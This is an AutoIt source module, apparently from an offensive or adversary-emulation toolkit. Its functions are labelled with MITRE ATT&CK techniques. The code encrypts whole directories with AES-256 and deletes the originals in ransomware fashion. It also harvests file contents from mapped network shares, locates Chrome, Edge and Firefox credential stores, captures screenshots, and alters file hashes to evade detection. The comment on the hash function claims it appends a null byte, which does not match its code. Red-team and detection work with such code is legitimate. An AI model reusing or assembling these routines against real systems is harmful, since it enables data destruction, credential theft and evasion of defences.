#include-once

; File and directory operations: read, write, encrypt, discover

Func ReadFile($sFilePath) ;DESCRIPTION:Read a file and return its content as a string;MITRE:Collection T1005
   Local $hFile = FileOpen($sFilePath, $FO_READ)
   If $hFile = -1 Then Return False
   Local $sContent = FileRead($hFile)
   FileClose($hFile)
   Return $sContent
EndFunc

Func LogToFile($sData, $sFilePath) ;DESCRIPTION:Append a data buffer to a file;MITRE:Collection T1005
   Local $hFile = FileOpen($sFilePath, $FO_APPEND)
   If $hFile = -1 Then
      MsgBox($MB_SYSTEMMODAL, "", "Failed to open log file: " & $sFilePath)
      Return False
   EndIf
   FileWrite($hFile, $sData & @CRLF)
   FileClose($hFile)
EndFunc

Func MutateFileHash($sFilePath) ;DESCRIPTION:Append a null byte to alter the file hash without breaking execution;MITRE:DefenseEvasion T1027
   Local $hFile = FileOpen($sFilePath, $FO_APPEND)
   If $hFile = -1 Then Return False
   FileWriteLine($hFile, "1")
   FileClose($hFile)
EndFunc

Func GetDesktopFiles() ;DESCRIPTION:Return a newline-separated list of files on the current user Desktop;MITRE:Discovery T1083
   Local $sResult  = ""
   Local $aFiles = _FileListToArray(@DesktopDir)
   If @error Then Return ""
   For $i = 1 To $aFiles[0]
      $sResult &= @CRLF & $aFiles[$i]
   Next
   Return $sResult
EndFunc

Func EnumerateShares() ;DESCRIPTION:Enumerate mapped network drives and read their file contents;MITRE:Collection T1039
   Local $sSeparator = "----------"
   Local $sBuffer    = ""
   Local $aDrives    = DriveGetDrive($DT_NETWORK)
   If @error Then Return ""
   Local $aExcluded  = ["desktop.ini", "My Music", "My Pictures", "My Videos"]
   For $i = 1 To $aDrives[0]
      Local $aFiles = _FileListToArray($aDrives[$i], "*")
      If @error Then ContinueLoop
      For $j = 1 To $aFiles[0]
         Local $bSkip = False
         For $k = 0 To UBound($aExcluded) - 1
            If $aFiles[$j] = $aExcluded[$k] Then
               $bSkip = True
               ExitLoop
            EndIf
         Next
         If $bSkip Then ContinueLoop
         Local $sFilePath = $aDrives[$i] & "\" & $aFiles[$j]
         $sBuffer &= $sSeparator & @CRLF & "Filename: " & $aFiles[$j] & @CRLF
         $sBuffer &= ReadFile($sFilePath) & @CRLF
      Next
      $sBuffer &= $sSeparator & @CRLF
   Next
   Return $sBuffer
EndFunc

Func EncryptFiles($sPassword, $sTarget) ;DESCRIPTION:AES-256 encrypt all regular files in a directory (or a single file);MITRE:Impact T1486
   Local $sPath = _PathFull($sTarget)
   If Not FileExists($sPath) Then Return False
   If FileGetAttrib($sPath) = "D" Then
      If DirGetSize($sPath) <= 0 Then Return False
      Local $aFiles = _FileListToArray($sPath, Default, Default, True)
      If @error Then Return False
      For $i = 1 To $aFiles[0]
         If FileGetAttrib($aFiles[$i]) = "A" Then
            Local $bOk = _Crypt_EncryptFile($aFiles[$i], $aFiles[$i] & ".crypt", $sPassword, $CALG_AES_256)
            If $bOk Then FileDelete($aFiles[$i])
         EndIf
      Next
   Else
      Local $bOk = _Crypt_EncryptFile($sPath, $sPath & ".crypt", $sPassword, $CALG_AES_256)
      If $bOk Then FileDelete($sPath)
   EndIf
EndFunc

Func DecryptFiles($sPassword, $sFolder) ;DESCRIPTION:AES-256 decrypt all .crypt files in a directory;MITRE:Impact T1486
   Local $sPath = _PathFull($sFolder)
   If Not FileExists($sPath) Then Return False
   Local $aFiles = _FileListToArray($sPath, "*.crypt")
   If @error Or $aFiles[0] = 0 Then Return False
   For $i = 1 To $aFiles[0]
      Local $sEncrypted = $sPath & "\" & $aFiles[$i]
      Local $sDecrypted = $sPath & "\" & StringTrimRight($aFiles[$i], 6)
      Local $bOk = _Crypt_DecryptFile($sEncrypted, $sDecrypted, $sPassword, $CALG_AES_256)
      If $bOk Then FileDelete($sEncrypted)
   Next
EndFunc

Func Unzip($sSource, $sDestination) ;DESCRIPTION:Expand a zip archive via PowerShell Expand-Archive;MITRE:-
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force " & $sSource & " " & $sDestination, "", @SW_HIDE)
EndFunc

Func FindFiles($sDir, $sPattern = "*") ;DESCRIPTION:Recursively find files matching a pattern; returns array [0]=count,[1..n]=paths or False;MITRE:Discovery T1083
   Local $aFiles = _FileListToArray($sDir, $sPattern, $FLTA_FILES, True)
   If @error Then Return False
   Return $aFiles
EndFunc

Func SearchFileContent($sDir, $sPattern, $sKeyword) ;DESCRIPTION:Find files matching pattern whose content contains a keyword; returns array [0]=count,[1..n]=paths or False;MITRE:Collection T1005
   Local $aFiles = _FileListToArray($sDir, $sPattern, $FLTA_FILES, True)
   If @error Then Return False
   Local $aMatches[1] = [0]
   For $i = 1 To $aFiles[0]
      If StringInStr(ReadFile($aFiles[$i]), $sKeyword) Then
         $aMatches[0] += 1
         ReDim $aMatches[$aMatches[0] + 1]
         $aMatches[$aMatches[0]] = $aFiles[$i]
      EndIf
   Next
   If $aMatches[0] = 0 Then Return False
   Return $aMatches
EndFunc

Func CaptureScreenshot($sFilePath = @TempDir & "\screenshot.bmp") ;DESCRIPTION:Capture the full screen to a file;MITRE:Collection T1113
   Return _ScreenCapture_Capture($sFilePath)
EndFunc

Func GetBrowserCredentialFiles() ;DESCRIPTION:Locate Chrome, Edge, and Firefox credential store files; returns array [0]=count,[1..n]=paths or False;MITRE:CredentialAccess T1555.003
   Local $aCandidates[3] = [ _
      @LocalAppDataDir & "\Google\Chrome\User Data\Default\Login Data", _
      @LocalAppDataDir & "\Microsoft\Edge\User Data\Default\Login Data", _
      @AppDataDir      & "\Mozilla\Firefox\Profiles"                     _
   ]
   Local $aFound[1] = [0]
   For $i = 0 To UBound($aCandidates) - 1
      If FileExists($aCandidates[$i]) Then
         $aFound[0] += 1
         ReDim $aFound[$aFound[0] + 1]
         $aFound[$aFound[0]] = $aCandidates[$i]
      EndIf
   Next
   If $aFound[0] = 0 Then Return False
   Return $aFound
EndFunc
